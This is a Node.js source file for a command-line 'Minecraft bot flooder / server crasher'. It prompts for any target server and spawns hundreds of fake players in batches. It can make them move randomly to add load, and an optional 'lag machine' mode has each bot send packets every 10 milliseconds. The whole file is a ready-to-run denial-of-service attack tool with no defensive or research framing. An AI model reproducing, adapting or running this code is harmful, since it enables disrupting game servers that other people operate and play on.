const mineflayer = require('mineflayer');
const chalk = require('chalk');
const readline = require('readline');

// stats tracking
let stats = {
    total: 0,
    connected: 0,
    failed: 0,
    kicked: 0,
    startTime: null
};

const bots = [];

// config defaults
let serverConfig = {
    host: '',
    port: 25565,
    version: '1.20.1',
    botCount: 0,
    movement: false,
    packetSpam: false
};

// name generator stuff
const namePool = [
    'Shadow', 'Dark', 'Night', 'Storm', 'Fire', 'Ice', 'Thunder', 'Lightning',
    'Dragon', 'Phoenix', 'Wolf', 'Tiger', 'Eagle', 'Hawk', 'Raven', 'Viper',
    'Blade', 'Ghost', 'Phantom', 'Reaper', 'Hunter', 'Warrior', 'Knight', 'Ninja',
    'Cyber', 'Neon', 'Pixel', 'Glitch', 'Matrix', 'Quantum', 'Nova', 'Stellar',
    'Toxic', 'Venom', 'Chaos', 'Void', 'Abyss', 'Inferno', 'Frost', 'Blaze',
    'Specter', 'Slayer', 'Doom', 'Crypt', 'Ember', 'Bolt', 'Rift', 'Shatter',
    'Pulse', 'Surge', 'Reactor', 'Titan', 'Golem', 'Leviathan', 'Serpent', 'Hydra',
    'Rogue', 'Sentinel', 'Vanguard', 'Emperor', 'Monarch', 'Warden', 'Striker', 'Ranger',
    'Zero', 'Alpha', 'Omega', 'Sigma', 'Delta', 'Echo', 'Nebula', 'Oblivion',
    'Eclipse', 'Solstice', 'Gravity', 'Orbit', 'Astro', 'Meteor', 'Comet',
    'Nightfall', 'Grim', 'Dread', 'Shade', 'Rune', 'Embercore', 'Coldsteel',
    'Lava', 'Magma', 'inferno', 'Shadow', 'Troll', 'Lighter', 'Lightning'
];

function generateRandomName() {
    // pick 2 words + random num
    const name1 = namePool[Math.floor(Math.random() * namePool.length)];
    const name2 = namePool[Math.floor(Math.random() * namePool.length)];
    const num = Math.floor(Math.random() * 9999);
    return `${name1}${name2}${num}`;
}

function displayHeader() {
    console.clear();
    console.log(chalk.cyan.bold('\n╔════════════════════════════════════════════════════════════╗'));
    console.log(chalk.cyan.bold('║         MINECRAFT BOT FLOODER - SERVER CRASHER             ║'));
    console.log(chalk.cyan.bold('╚════════════════════════════════════════════════════════════╝\n'));
}

function updateStats() {
    const elapsed = stats.startTime ? ((Date.now() - stats.startTime) / 1000).toFixed(1) : 0;
    const rate = stats.startTime ? (stats.connected / elapsed).toFixed(1) : 0;

    // overwrite current line nicely
    process.stdout.write('\r' + ' '.repeat(100) + '\r');
    process.stdout.write(
        chalk.green(`✓ Connected: ${stats.connected}`) + ' | ' +
        chalk.red(`✗ Failed: ${stats.failed}`) + ' | ' +
        chalk.yellow(`⚠ Kicked: ${stats.kicked}`) + ' | ' +
        chalk.cyan(`⏱ Time: ${elapsed}s`) + ' | ' +
        chalk.magenta(`⚡ Rate: ${rate} bots/s`)
    );
}

function startRandomMovement(bot) {
    // look around randomly
    setInterval(() => {
        if (!bot) return;
        const yaw = (Math.random() * Math.PI) - (0.5 * Math.PI);
        const pitch = (Math.random() * Math.PI) - (0.5 * Math.PI);
        bot.look(yaw, pitch);
    }, 1000);

    // move around a bit so we look real / cause more load
    setInterval(() => {
        if (!bot) return;
        const controls = ['forward', 'back', 'left', 'right', 'jump', 'sprint'];

        // reset keys
        controls.forEach(c => bot.setControlState(c, false));

        // pick random stuff
        const randomControl = controls[Math.floor(Math.random() * controls.length)];
        const randomControl2 = controls[Math.floor(Math.random() * controls.length)];

        bot.setControlState(randomControl, true);

        // sometimes do a combo
        if (Math.random() > 0.5) {
            bot.setControlState(randomControl2, true);
        }

        // bunny hop
        if (Math.random() > 0.7) {
            bot.setControlState('jump', true);
        }
    }, 500 + Math.random() * 1000);
}

function startPacketSpam(bot) {
    if (!bot || !bot._client) return;

    // packet spam loop (10ms = 100/sec)
    setInterval(() => {
        if (!bot._client) return;

        try {
            // arm animation spam
            bot._client.write('arm_animation', { hand: 0 });

            // offhand swap spam (heavy on server)
            bot._client.write('block_dig', {
                status: 6,
                location: { x: 0, y: 0, z: 0 },
                face: 1
            });
        } catch (e) { }
    }, 10);
}

function createBot(username) {
    const bot = mineflayer.createBot({
        host: serverConfig.host,
        port: serverConfig.port,
        username: username,
        hideErrors: true,
        checkTimeoutInterval: 30000,
        logErrors: false
    });

    bot.on('login', () => {
        stats.connected++;
        updateStats();
    });

    bot.on('spawn', () => {
        if (serverConfig.movement) startRandomMovement(bot);
        if (serverConfig.packetSpam) startPacketSpam(bot);
    });

    bot.on('kicked', (reason) => {
        stats.kicked++;
        updateStats();
        bot.end();
    });

    bot.on('error', (err) => {
        stats.failed++;
        if (stats.failed <= 5) {
            console.log(chalk.red(`\n[ERROR] ${username}: ${err.message}`));
        }
        updateStats();
    });

    bot.on('end', () => {
        const index = bots.indexOf(bot);
        if (index > -1) {
            bots.splice(index, 1);
        }
    });

    bots.push(bot);
    return bot;
}

// spawn batches async
async function spawnBots() {
    console.log(chalk.cyan.bold('\n🚀 Starting bot flood attack...\n'));

    stats.startTime = Date.now();

    const totalBots = serverConfig.botCount;
    const batchSize = 50;
    const batchDelay = 100;

    for (let i = 0; i < totalBots; i += batchSize) {
        const currentBatch = Math.min(batchSize, totalBots - i);

        for (let j = 0; j < currentBatch; j++) {
            const username = generateRandomName();
            stats.total++;
            createBot(username);
        }

        if (i + batchSize < totalBots) {
            await new Promise(resolve => setTimeout(resolve, batchDelay));
        }
    }

    console.log(chalk.green.bold(`\n✓ All ${totalBots} bots spawned!\n`));

    // refresh stats
    const statsInterval = setInterval(() => {
        updateStats();

        if (bots.length === 0) {
            clearInterval(statsInterval);
            console.log(chalk.red.bold('\n\n⚠ All bots disconnected. Attack finished.\n'));
            process.exit(0);
        }
    }, 500);
}

// ctrl+c shutdown
process.on('SIGINT', () => {
    console.log(chalk.red.bold('\n\n⚠ Shutting down all bots...\n'));
    bots.forEach(bot => bot.end());
    process.exit(0);
});

// main cli entry point
async function getUserInput() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const question = (query) => new Promise((resolve) => rl.question(query, resolve));

    displayHeader();

    const serverInput = await question(chalk.yellow('Enter server IP (e.g., play.hypixel.net or 127.0.0.1:25565): '));

    if (serverInput.includes(':')) {
        const parts = serverInput.split(':');
        serverConfig.host = parts[0];
        serverConfig.port = parseInt(parts[1]) || 25565;
    } else {
        serverConfig.host = serverInput;
        serverConfig.port = 25565;
    }

    const botCountInput = await question(chalk.yellow('Enter bot amount (recommended: 100-400): '));
    serverConfig.botCount = parseInt(botCountInput) || 100;

    const movementInput = await question(chalk.yellow('Enable Random Movement? (y/n): '));
    serverConfig.movement = movementInput.toLowerCase() === 'y';

    const spamInput = await question(chalk.yellow('Enable Packet Spam (Lag Machine)? (y/n): '));
    serverConfig.packetSpam = spamInput.toLowerCase() === 'y';

    rl.close();

    console.log(chalk.gray('\n' + '─'.repeat(60)));
    console.log(chalk.cyan.bold('\n📋 Attack Configuration:'));
    console.log(chalk.white(`   Target: ${chalk.green.bold(serverConfig.host + ':' + serverConfig.port)}`));
    console.log(chalk.white(`   Bot Count: ${chalk.green.bold(serverConfig.botCount)}`));
    console.log(chalk.white(`   Batch Size: ${chalk.green.bold('50 bots/batch')}`));
    console.log(chalk.white(`   Version: ${chalk.cyan('Auto-detect')}`));
    console.log(chalk.white(`   Movement: ${serverConfig.movement ? chalk.green('ENABLED') : chalk.red('DISABLED')}`));
    console.log(chalk.white(`   Packet Spam: ${serverConfig.packetSpam ? chalk.green('ENABLED') : chalk.red('DISABLED')}`));
    console.log(chalk.gray('\n' + '─'.repeat(60)));

    console.log(chalk.yellow.bold('\n⚡ Starting attack in...'));
    for (let i = 3; i > 0; i--) {
        console.log(chalk.red.bold(`   ${i}...`));
        await new Promise(resolve => setTimeout(resolve, 1000));
    }

    await spawnBots();
}

getUserInput().catch(err => {
    console.error(chalk.red.bold('Error:'), err);
    process.exit(1);
});
